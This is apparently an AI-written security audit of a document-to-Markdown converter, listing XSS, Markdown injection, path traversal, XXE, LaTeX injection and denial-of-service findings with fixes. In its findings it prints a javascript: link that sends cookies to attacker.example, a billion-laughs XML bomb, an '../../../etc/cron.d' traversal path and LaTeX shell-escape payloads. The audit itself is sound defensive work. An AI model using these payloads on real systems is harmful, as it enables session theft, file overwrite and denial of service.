# Security Review — doc2md

**Reviewer:** Security Analyst (Claude)
**Date:** 2026-03-20
**Scope:** Full source audit of `src/doc2md/` and supporting test/config files
**Branch:** `claude/security-review-doc2md-E4cl6`

---

## Executive Summary

`doc2md` is a document-to-Markdown converter that parses untrusted user-supplied files (PDF, DOCX, XLSX) and produces Markdown output. Because the input surface is entirely attacker-controlled, the primary threat model is **malicious document exploitation**. The review identified **2 Critical**, **4 High**, **3 Medium**, and **3 Low / Informational** findings. No malware or backdoors were found.

---

## Findings

### CRITICAL

---

#### SEC-01 — XSS / Code Execution via Unsanitized Link Href

| | |
|---|---|
| **File** | `src/doc2md/renderers/markdown.py:57`, `src/doc2md/parsers/docx.py:70–74` |
| **CVSS (estimate)** | 9.3 (Critical) |

**Description**

Hyperlink targets extracted from DOCX relationship parts are embedded verbatim into the Markdown output:

```python
# docx.py:70–74
rel_id = parent.get(qn("r:id"))
href = run.part.rels[rel_id].target_ref   # ← attacker-controlled

# markdown.py:57
text = f"[{text}]({s.link_href})"          # ← no validation
```

A crafted DOCX can contain:

```
r:id → javascript:fetch('https://attacker.example/'+document.cookie)
```

When the Markdown is rendered in any browser-based context (GitHub, MkDocs, Jupyter, VS Code preview, etc.) this executes JavaScript.  Beyond `javascript:` URIs, `data:text/html,...` and `vbscript:` (IE) payloads are also exploitable. `file://` URIs can force local file reads in Electron-based renderers (VS Code).

**Remediation**

Validate `link_href` before embedding. Accept only `http`, `https`, and `mailto` schemes. Reject or percent-encode everything else.

```python
from urllib.parse import urlparse

_SAFE_SCHEMES = {"http", "https", "mailto"}

def _safe_href(url: str | None) -> str | None:
    if url is None:
        return None
    scheme = urlparse(url).scheme.lower()
    return url if scheme in _SAFE_SCHEMES else None
```

---

#### SEC-02 — Markdown Injection via Table Cell / Heading Content

| | |
|---|---|
| **File** | `src/doc2md/renderers/markdown.py:77, 87`, `src/doc2md/parsers/docx.py:91–95`, `src/doc2md/parsers/pdf.py:112` |
| **CVSS (estimate)** | 8.1 (Critical) |

**Description**

Cell text and heading text from parsed documents are inserted into Markdown without escaping Markdown-special characters:

```python
# markdown.py:77
lines.append("| " + " | ".join(c.text for c in header_row) + " |")

# markdown.py:44
return f"{'#' * node.level} {node.text}"
```

A document cell containing `injected | extra column` breaks table structure. A cell containing `](javascript:evil)` following a partial link creates unexpected link nodes. A heading of `#### ](javascript:evil)` can produce an XSS link when rendered. Because `| ` inside a GFM table cell is parsed as a column separator, injected column content bypasses rendered table boundaries and can produce dangling Markdown constructs that downstream parsers misinterpret.

**Remediation**

Escape `|` in table cell text, and escape `#`, `[`, `]`, `(`, `)`, `*`, `_`, `` ` `` in all rendered text:

```python
def _escape_md(text: str) -> str:
    for ch in r'\`*_{}[]()#+-.!|':
        text = text.replace(ch, '\\' + ch)
    return text
```

---

### HIGH

---

#### SEC-03 — Path Traversal in Output Directory

| | |
|---|---|
| **File** | `src/doc2md/cli.py:39–42` |
| **CVSS (estimate)** | 7.5 (High) |

**Description**

The `--output` argument is accepted without path validation and used directly to create directories and write files:

```python
out = Path(args.output)
out.mkdir(parents=True, exist_ok=True)          # creates arbitrary directories
(out / "document.md").write_text(md)            # writes arbitrary path
```

An attacker who controls command invocation (e.g., via a web wrapper, CI pipeline, or Makefile) can supply `--output ../../../etc/cron.d` to write content outside the intended output directory.

**Remediation**

Resolve and validate the output path against an allowed base directory, or at minimum reject paths containing `..`:

```python
out = Path(args.output).resolve()
# Optionally enforce: assert out.is_relative_to(Path.cwd())
```

---

#### SEC-04 — Unbounded Memory Consumption (No File Size Limits)

| | |
|---|---|
| **File** | `src/doc2md/parsers/xlsx.py:32`, `src/doc2md/parsers/pdf.py:28–32`, `src/doc2md/parsers/docx.py:24` |
| **CVSS (estimate)** | 7.5 (High — DoS) |

**Description**

No file size check is performed before parsing. All rows are loaded into memory at once:

```python
# xlsx.py:32
rows = list(ws.iter_rows())   # entire worksheet in RAM
```

PDF images are also fully loaded into memory as raw bytes (`Image.data: bytes`). An adversary can submit a crafted 1 GB XLSX with 10 million rows, or a PDF with hundreds of embedded high-resolution images, to exhaust available memory and crash the process (OOM kill).

**Remediation**

Enforce a configurable maximum file size before opening:

```python
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
if path.stat().st_size > MAX_FILE_SIZE:
    raise ValueError(f"File too large: {path.stat().st_size} bytes")
```

For XLSX, add a maximum row count guard inside the sheet parser.

---

#### SEC-05 — XML External Entity (XXE) / XML Bomb via DOCX/XLSX

| | |
|---|---|
| **File** | `src/doc2md/parsers/docx.py:24`, `src/doc2md/parsers/xlsx.py:16` |
| **CVSS (estimate)** | 7.5 (High) |

**Description**

DOCX and XLSX files are ZIP archives containing XML. The `python-docx` and `openpyxl` libraries use Python's XML parsers internally. While `lxml` (used by `python-docx`) is generally safe against classic XXE by default, `openpyxl` uses `xml.etree.ElementTree` which is vulnerable to exponential entity expansion (billion laughs):

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

Neither parser imposes resource limits on entity expansion or XML nesting depth.

**Remediation**

- For `openpyxl`: use `defusedxml` as a drop-in replacement for the internal XML parser, or use `openpyxl`'s `read_only=True` mode which is somewhat safer.
- Audit installed library versions. `openpyxl >= 3.1.2` has partial mitigations; ensure the lock file reflects a patched version.
- Add `defusedxml` as a dependency and monkey-patch before loading.

---

### MEDIUM

---

#### SEC-06 — LaTeX Injection in Formula Nodes

| | |
|---|---|
| **File** | `src/doc2md/renderers/markdown.py:97–100` |
| **CVSS (estimate)** | 5.3 (Medium) |

**Description**

LaTeX formula content is embedded verbatim into the output:

```python
return f"${node.latex}$"       # inline
return f"$$\n{node.latex}\n$$" # block
```

In Markdown environments that render MathJax or KaTeX (Jupyter, GitHub, Hugo, Pandoc), a crafted formula can include `\href{javascript:evil}{click}` (KaTeX supports `\href`) or `\url{...}` to inject clickable URLs. Some TeX engines support `\write18` (shell escape) which, if enabled on the rendering server, executes arbitrary shell commands.

**Remediation**

Validate or strip LaTeX commands that can embed URLs or trigger shell escapes. At minimum, block `\href`, `\url`, `\write18`, `\input`, and `\include`.

---

#### SEC-07 — Recursive List Rendering Stack Overflow (DoS)

| | |
|---|---|
| **File** | `src/doc2md/renderers/markdown.py:105–115` |
| **CVSS (estimate)** | 5.3 (Medium — DoS) |

**Description**

`_list()` calls itself recursively with no depth limit:

```python
def _list(self, node: List, indent: int) -> str:
    for i, item in enumerate(node.items):
        for child in item.children:
            child_list = List(ordered=node.ordered, items=[child])
            lines.append(self._list(child_list, indent + 1))   # unbounded recursion
```

A crafted DOCX with 1000+ levels of nested list items triggers Python's default recursion limit (~1000 frames), raising `RecursionError` and crashing the process. An attacker-supplied document can reliably trigger this.

**Remediation**

Add a depth guard:

```python
MAX_LIST_DEPTH = 20

def _list(self, node: List, indent: int) -> str:
    if indent > MAX_LIST_DEPTH:
        return ""
    ...
```

---

#### SEC-08 — Subprocess Invoked Without Shell but Path Passed as String

| | |
|---|---|
| **File** | `src/doc2md/cli.py:56–65` |
| **CVSS (estimate)** | 4.0 (Medium — Defense in Depth) |

**Description**

External tools are invoked with `subprocess.run(list, ...)` which is safe against shell injection. However, the `path` argument is passed as `str(path)` and appended to the command list. While a list-form subprocess does not interpret shell metacharacters, the called tool (`uvx markitdown`, `pandoc`) may have its own path-handling vulnerabilities, or the `uvx` tool itself may resolve packages from untrusted sources. If the calling environment ever switches to `shell=True`, this immediately becomes a shell injection vector.

Additionally, the `bench` command does not validate the `--against` tool list beyond implicit allowlisting (unrecognised tool names return empty string). A future refactor could inadvertently break this protection.

**Remediation**

Explicitly allowlist valid tool names before calling `_convert_with_tool`:

```python
ALLOWED_TOOLS = {"markitdown", "pandoc"}
tools = [t.strip() for t in args.against.split(",") if t.strip() in ALLOWED_TOOLS]
```

---

### LOW / INFORMATIONAL

---

#### SEC-09 — Filesystem Path Disclosure in Document IR

| | |
|---|---|
| **File** | `src/doc2md/ir/nodes.py:96`, `src/doc2md/cli.py:28–35` |

**Description**

`Document.source_path` stores the absolute filesystem path passed to the parser. If the `Document` object is ever serialised (JSON, pickle, logging) in an API or service context, the server's absolute path is leaked to callers, revealing directory structure and usernames.

**Remediation**

Store only the filename (`path.name`) rather than the full path, or omit `source_path` from serialised output.

---

#### SEC-10 — Silent Exception Suppression in PDF Image Extraction

| | |
|---|---|
| **File** | `src/doc2md/parsers/pdf.py:57–58` |

**Description**

```python
except Exception:
    pass
```

All exceptions during image extraction are silently discarded. This masks parsing errors that may indicate malformed or malicious PDF content (e.g., a crafted `xref` triggering a library-level vulnerability). Silent suppression also hinders incident response.

**Remediation**

Log the exception at `WARNING` level at minimum: `logging.warning("PDF image extraction failed: %s", e)`.

---

#### SEC-11 — Dead Import (`tempfile`)

| | |
|---|---|
| **File** | `src/doc2md/cli.py:6` |

**Description**

`import tempfile` is present but never used. While not a vulnerability, dead imports are a code hygiene issue and may indicate incomplete or removed functionality that should be reviewed.

---

## Summary Table

| ID | Severity | Title | File(s) |
|----|----------|-------|---------|
| SEC-01 | **Critical** | XSS via unsanitized `link_href` | `markdown.py:57`, `docx.py:70` |
| SEC-02 | **Critical** | Markdown injection via cell/heading content | `markdown.py:44,77,87` |
| SEC-03 | **High** | Path traversal in `--output` | `cli.py:39–42` |
| SEC-04 | **High** | Unbounded memory (no file size limits) | all parsers |
| SEC-05 | **High** | XXE / XML bomb via DOCX/XLSX | `docx.py:24`, `xlsx.py:16` |
| SEC-06 | **Medium** | LaTeX injection in formula nodes | `markdown.py:97–100` |
| SEC-07 | **Medium** | Recursive list rendering — stack overflow DoS | `markdown.py:105–115` |
| SEC-08 | **Medium** | Subprocess allowlist not enforced explicitly | `cli.py:87–95` |
| SEC-09 | **Low** | Filesystem path disclosure in IR | `nodes.py:96` |
| SEC-10 | **Low** | Silent exception suppression (PDF images) | `pdf.py:57–58` |
| SEC-11 | **Info** | Dead import `tempfile` | `cli.py:6` |

---

## Recommendations (Priority Order)

1. **Immediately** sanitise `link_href` to `http`/`https`/`mailto` only (SEC-01).
2. **Immediately** escape Markdown-special characters in all rendered text (SEC-02).
3. Resolve output path and reject `..` traversal (SEC-03).
4. Add a pre-parse file size limit (SEC-04).
5. Add `defusedxml` dependency or enforce library version minimums for XML safety (SEC-05).
6. Add recursion depth guard to `_list()` (SEC-07).
7. Allowlist tool names explicitly in `cmd_bench` (SEC-08).
8. Add LaTeX command filtering (SEC-06).
9. Replace bare `except Exception: pass` with logging (SEC-10).
10. Remove dead `tempfile` import (SEC-11).

---

## Out of Scope

- Dependency supply-chain audit (lock file integrity, typosquatting)
- Runtime container/sandbox isolation
- Authentication and authorisation (not present — CLI tool)
